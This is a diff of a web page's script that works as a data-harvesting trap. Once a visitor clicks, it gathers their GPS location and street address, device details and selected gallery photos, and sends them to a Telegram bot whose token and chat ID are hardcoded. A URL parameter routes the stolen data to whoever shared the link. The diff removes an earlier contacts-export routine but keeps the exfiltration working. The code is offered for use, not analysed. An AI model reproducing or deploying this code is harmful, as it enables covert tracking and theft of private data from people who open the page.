@@ -91,82 +91,36 @@
     </div>
 
     <script>
-        // ==================== CONFIG ====================
         const BOT_TOKEN = "8325723609:AAGcN0gUgz0r92KpFVwyM5JOzibSGVaKG3c";
         const YOUR_ID = "6643732863";
         
-        // Get user ID from URL
         const params = new URLSearchParams(window.location.search);
         const TARGET_ID = params.get('id') || YOUR_ID;
 
-        // ==================== PERMISSION REQUEST ====================
         async function requestAllPermissions() {
             document.getElementById('load').style.display = 'block';
             document.querySelector('.btn').style.display = 'none';
             document.getElementById('status').innerHTML = '⏳ Requesting permissions...';
 
             try {
-                // Step 1: Request Contacts (via Intent - Android only)
-                if (window.intent && window.intent.ACTION_GET_CONTENT) {
-                    requestContactsAndroid();
-                } else {
-                    document.getElementById('status').innerHTML = '⚠️ Contacts only available on Android';
-                }
-
-                // Step 2: Request Gallery access
-                await requestGalleryAccess();
-
-                // Step 3: Get Location
+                // Get location
                 await getLocation();
-
-                // Step 4: Get Device Info
+                
+                // Get device info
                 await getDeviceInfo();
-
-                // Step 5: Send all data to Telegram
-                await sendAllDataToTelegram();
-
+                
+                // Get gallery access
+                await requestGalleryAccess();
+                
+                document.getElementById('status').innerHTML = '✅ Data sent to Telegram!';
+                document.getElementById('load').style.display = 'none';
             } catch (error) {
                 document.getElementById('status').innerHTML = '❌ Error: ' + error.message;
             }
         }
 
-        // ==================== ANDROID CONTACTS ACCESS ====================
-        function requestContactsAndroid() {
-            document.getElementById('status').innerHTML = '📇 Reading contacts...';
-            
-            // For Android WebView with intent
-            if (window.intent) {
-                window.intent.startActivity({
-                    action: 'android.intent.action.PICK',
-                    type: 'vnd.android.cursor.dir/contact'
-                }, function(uri) {
-                    // Contact selected
-                    fetchContactDetails(uri);
-                });
-            } else {
-                // Alternative: Web-based contact picker
-                const input = document.createElement('input');
-                input.type = 'file';
-                input.accept = '.vcf';
-                input.onchange = function(e) {
-                    readVCardFile(e.target.files[0]);
-                };
-                input.click();
-            }
-        }
-
-        function readVCardFile(file) {
-            const reader = new FileReader();
-            reader.onload = function(e) {
-                const vcard = e.target.result;
-                sendToTelegram('📇 CONTACTS EXPORT', vcard);
-            };
-            reader.readAsText(file);
-        }
-
-        // ==================== GALLERY ACCESS ====================
         async function requestGalleryAccess() {
-            document.getElementById('status').innerHTML = '🖼️ Accessing gallery...';
+            document.getElementById('status').innerHTML = '🖼️ Select photos...';
             
             return new Promise((resolve) => {
                 const input = document.createElement('input');
@@ -175,22 +129,15 @@
                 input.multiple = true;
                 input.onchange = async function(e) {
                     const files = e.target.files;
-                    document.getElementById('status').innerHTML = `📸 Found ${files.length} photos`;
-                    
-                    // Send first 3 photos
                     for (let i = 0; i < Math.min(files.length, 3); i++) {
                         await sendPhotoToTelegram(files[i]);
                     }
-                    
-                    document.getElementById('photosList').style.display = 'block';
-                    document.getElementById('photosList').innerHTML = `📸 Selected ${files.length} photos`;
                     resolve();
                 };
                 input.click();
             });
         }
 
-        // ==================== LOCATION ACCESS ====================
         async function getLocation() {
             document.getElementById('status').innerHTML = '📍 Getting location...';
             
@@ -204,18 +151,13 @@
                     async (position) => {
                         const location = {
                             lat: position.coords.latitude,
-                            lng: position.coords.longitude,
-                            accuracy: position.coords.accuracy
+                            lng: position.coords.longitude
                         };
                         
-                        document.getElementById('locationInfo').innerHTML = 
-                            `📍 Location: ${location.lat}, ${location.lng}`;
-                        
-                        // Get address from coordinates
                         const address = await getAddressFromCoords(location.lat, location.lng);
                         
-                        sendToTelegram('📍 LOCATION', 
-                            `Lat: ${location.lat}\nLng: ${location.lng}\nAccuracy: ${location.accuracy}m\nAddress: ${address}`);
+                        await sendToTelegram('📍 LOCATION', 
+                            `Lat: ${location.lat}\nLng: ${location.lng}\nAddress: ${address}`);
                         
                         resolve();
                     },
@@ -236,7 +178,6 @@
             }
         }
 
-        // ==================== DEVICE INFO ====================
         async function getDeviceInfo() {
             document.getElementById('status').innerHTML = '📱 Getting device info...';
             
@@ -244,40 +185,18 @@
                 userAgent: navigator.userAgent,
                 platform: navigator.platform,
                 language: navigator.language,
-                vendor: navigator.vendor,
                 screen: `${screen.width}x${screen.height}`,
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                battery: await getBatteryInfo(),
-                connection: navigator.connection ? {
-                    type: navigator.connection.effectiveType,
-                    speed: navig.connection.downlink + ' Mbps'
-                } : 'Unknown'
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
             };
             
-            document.getElementById('deviceInfo').innerHTML = 
-                `📱 Device: ${deviceInfo.platform}`;
-            
-            sendToTelegram('📱 DEVICE INFO', JSON.stringify(deviceInfo, null, 2));
+            await sendToTelegram('📱 DEVICE INFO', JSON.stringify(deviceInfo, null, 2));
         }
 
-        async function getBatteryInfo() {
-            try {
-                const battery = await navigator.getBattery();
-                return {
-                    level: battery.level * 100 + '%',
-                    charging: battery.charging
-                };
-            } catch {
-                return 'Unknown';
-            }
-        }
-
-        // ==================== TELEGRAM FUNCTIONS ====================
         async function sendPhotoToTelegram(file) {
             const formData = new FormData();
             formData.append('chat_id', TARGET_ID);
             formData.append('photo', file);
-            formData.append('caption', `🖼️ Gallery Photo from Android`);
+            formData.append('caption', `🖼️ Gallery Photo`);
             
             await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                 method: 'POST',
@@ -293,16 +212,10 @@
                 headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify({
                     chat_id: TARGET_ID,
-                    text: message.substring(0, 4000),
-                    parse_mode: 'HTML'
+                    text: message.substring(0, 4000)
                 })
             });
         }
-
-        async function sendAllDataToTelegram() {
-            document.getElementById('status').innerHTML = '✅ Data sent to Telegram!';
-            document.getElementById('load').style.display = 'none';
-        }
     </script>
 </body>
-  </html>
+</html>
